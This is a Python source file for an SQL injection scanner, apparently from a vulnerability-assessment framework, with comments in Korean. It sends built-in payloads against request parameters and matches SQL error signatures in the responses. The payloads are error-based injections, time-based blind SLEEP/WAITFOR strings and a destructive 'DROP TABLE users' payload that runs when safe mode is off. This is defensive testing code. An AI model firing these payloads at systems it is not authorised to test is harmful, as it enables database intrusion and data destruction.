"""
SQL Injection Testing Tool

OWASP: A05:2025 - Injection
CWE:   CWE-89 (SQL Injection)

extra 옵션:
    - payload_list (list[str]): 테스트할 SQL 인젝션 페이로드 목록
      기본값: 기본 에러 기반 페이로드 세트 사용
    - detect_time_based (bool): 시간 기반 Blind SQLi 탐지 여부
      기본값: False
    - time_threshold_ms (int): 시간 기반 탐지 시 지연 판정 기준 (밀리초)
      기본값: 5000
"""

from __future__ import annotations

import requests as http_client
from urllib.parse import urljoin

from va_mcp.core.base import BaseTool
from va_mcp.core.constants import Confidence, ErrorCode, Severity, ToolStatus
from va_mcp.core.schemas import Evidence, ToolInput, ToolResult
from va_mcp.core.utils import (
    build_tool_error,
    mask_sensitive,
    sanitize_request_body,
    sanitize_response_sample,
    utc_now_iso,
)


# ── 기본 페이로드 (에러 기반 / 읽기 전용) ──────────────────────────
DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "' AND '1'='2",
    "' OR 1=1#",
    "admin'--",
]

# safe_mode=False 일 때만 추가로 사용하는 파괴적 페이로드
UNSAFE_PAYLOADS = [
    "1; DROP TABLE users--",
]

# 시간 기반 Blind SQL Injection 페이로드
TIME_BASED_PAYLOADS = [
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
]

# 응답에서 SQL 에러를 감지하기 위한 시그니처 (소문자 비교)
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "incorrect syntax near",
    "unexpected end of sql command",
    "invalid query",
    "ora-00933",
    "ora-01756",
    "pg::error",
    "psqlexception",
    "syntax error at or near",
    "unterminated string",
    "sql command not properly ended",
    "sqlstate",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_query",
    "sqlite3::query",
    "sqlite_error",
]


class SqlInjectionTool(BaseTool):
    tool_id = "sql_injection"
    tool_name = "SQL Injection Testing"

    def run(self, tool_input: ToolInput) -> ToolResult:
        started_at = utc_now_iso()

        try:
            # ── 입력 검증 ──────────────────────────────────
            if tool_input.request is None:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.SKIPPED,
                    severity=Severity.INFO,
                    confidence=Confidence.LOW,
                    title="요청 정보 없음",
                    description="ToolInput.request가 None입니다. 테스트할 API 요청 정보를 제공해주세요.",
                    evidence=[],
                    started_at=started_at,
                    ended_at=ended_at,
                )

            # ── 옵션 추출 ──────────────────────────────────
            extra = tool_input.options.extra
            payload_list = extra.get("payload_list", DEFAULT_PAYLOADS)
            detect_time_based = extra.get("detect_time_based", False)
            time_threshold_ms = extra.get("time_threshold_ms", 5000)

            safe_mode = tool_input.options.safe_mode
            max_requests = tool_input.options.max_requests
            timeout_ms = tool_input.options.timeout
            timeout_sec = timeout_ms / 1000  # requests 라이브러리는 초 단위

            # safe_mode=False일 때만 파괴적 페이로드 추가
            if not safe_mode:
                payload_list = list(payload_list) + UNSAFE_PAYLOADS

            # 시간 기반 탐지 옵션이 켜져 있으면 시간 기반 페이로드 추가
            if detect_time_based:
                payload_list = list(payload_list) + TIME_BASED_PAYLOADS

            # ── 테스트 대상 파라미터 결정 ─────────────────────
            method = tool_input.request.method.upper()
            path = tool_input.request.path
            headers = dict(tool_input.request.headers)
            query = dict(tool_input.request.query)
            body = dict(tool_input.request.body) if tool_input.request.body else {}

            # GET → query 파라미터, POST/PUT 등 → body 파라미터
            if method == "GET":
                test_params = list(query.keys())
            else:
                test_params = list(body.keys())

            if not test_params:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.SKIPPED,
                    severity=Severity.INFO,
                    confidence=Confidence.LOW,
                    title="테스트할 파라미터 없음",
                    description="요청에서 테스트할 파라미터를 찾지 못했습니다. "
                                "query 또는 body에 파라미터를 포함해주세요.",
                    evidence=[],
                    started_at=started_at,
                    ended_at=ended_at,
                )

            # ── 타겟 URL 구성 ─────────────────────────────
            base_url = tool_input.target.base_url.rstrip("/")
            full_url = urljoin(base_url + "/", path.lstrip("/"))

            # ── 페이로드 테스트 루프 ──────────────────────────
            evidences: list[Evidence] = []
            request_count = 0

            for param in test_params:
                for payload in payload_list:
                    # max_requests 제한 확인
                    if request_count >= max_requests:
                        break

                    try:
                        if method == "GET":
                            test_query = dict(query)
                            test_query[param] = payload
                            resp = http_client.get(
                                full_url,
                                params=test_query,
                                headers=headers,
                                timeout=timeout_sec,
                                allow_redirects=False,
                            )
                            request_info = {
                                "method": "GET",
                                "path": path,
                                "headers": mask_sensitive(headers),
                                "query": {param: payload},
                            }
                        else:
                            test_body = dict(body)
                            test_body[param] = payload
                            resp = http_client.request(
                                method,
                                full_url,
                                headers=headers,
                                json=test_body,
                                timeout=timeout_sec,
                                allow_redirects=False,
                            )
                            request_info = {
                                "method": method,
                                "path": path,
                                "headers": mask_sensitive(headers),
                                "body": sanitize_request_body(test_body),
                            }

                        request_count += 1

                        # ── 응답 분석: SQL 에러 시그니처 감지 ────────
                        response_lower = resp.text.lower()
                        detected = [
                            sig for sig in SQL_ERROR_SIGNATURES
                            if sig in response_lower
                        ]

                        if detected:
                            evidences.append(
                                Evidence(
                                    request=request_info,
                                    response_status=resp.status_code,
                                    response_headers=dict(resp.headers),
                                    response_body_sample=sanitize_response_sample(resp.text),
                                    note=(
                                        f"파라미터 '{param}'에 페이로드 '{payload}' 삽입 시 "
                                        f"SQL 에러 시그니처 감지: {detected[:3]}"
                                    ),
                                )
                            )

                    except http_client.Timeout:
                        request_count += 1
                        # 시간 기반 페이로드에서 타임아웃 → Blind SQLi 가능성
                        if detect_time_based and (
                            "waitfor" in payload.lower()
                            or "sleep" in payload.lower()
                            or "pg_sleep" in payload.lower()
                        ):
                            evidences.append(
                                Evidence(
                                    request={
                                        "method": method,
                                        "path": path,
                                        "headers": mask_sensitive(headers),
                                    },
                                    response_status=0,
                                    response_body_sample="[TIMEOUT]",
                                    note=(
                                        f"파라미터 '{param}'에 시간 지연 페이로드 '{payload}' 삽입 시 "
                                        f"타임아웃 발생 — Blind SQL Injection 가능성"
                                    ),
                                )
                            )

                    except http_client.RequestException:
                        request_count += 1
                        continue

                # max_requests 초과 시 외부 루프도 중단
                if request_count >= max_requests:
                    break

            # ── 결과 판정 ──────────────────────────────────
            if evidences:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.VULNERABLE,
                    severity=Severity.CRITICAL,
                    confidence=Confidence.MEDIUM,
                    title="SQL Injection 취약점 발견",
                    description=(
                        f"총 {len(evidences)}건의 SQL Injection 징후가 감지되었습니다. "
                        f"테스트 파라미터: {test_params}"
                    ),
                    owasp=["A05:2025 Injection"],
                    cwe=["CWE-89"],
                    evidence=evidences,
                    recommendation=(
                        "1. Prepared Statement(파라미터화된 쿼리)를 사용하세요.\n"
                        "2. ORM을 사용하여 직접 SQL 문자열을 조합하지 마세요.\n"
                        "3. 입력값에 대한 화이트리스트 검증을 적용하세요.\n"
                        "4. 데이터베이스 사용자 권한을 최소화하세요.\n"
                        "5. 에러 메시지에 SQL 상세 정보가 노출되지 않도록 하세요."
                    ),
                    started_at=started_at,
                    ended_at=ended_at,
                )

            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.PASSED,
                severity=Severity.INFO,
                confidence=Confidence.MEDIUM,
                title="SQL Injection 취약점 미발견",
                description=(
                    f"테스트한 파라미터({test_params})에서 "
                    f"SQL Injection 징후가 감지되지 않았습니다. "
                    f"(총 {request_count}건 요청)"
                ),
                owasp=["A05:2025 Injection"],
                cwe=["CWE-89"],
                started_at=started_at,
                ended_at=ended_at,
            )

        except Exception as exc:
            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.ERROR,
                severity=Severity.INFO,
                confidence=Confidence.LOW,
                title="SQL Injection 테스트 실행 오류",
                description=f"테스트 실행 중 예외가 발생했습니다: {str(exc)}",
                started_at=started_at,
                ended_at=ended_at,
                errors=[
                    build_tool_error(
                        error_code=ErrorCode.INTERNAL_ERROR,
                        error_message=str(exc),
                        retryable=False,
                    )
                ],
            )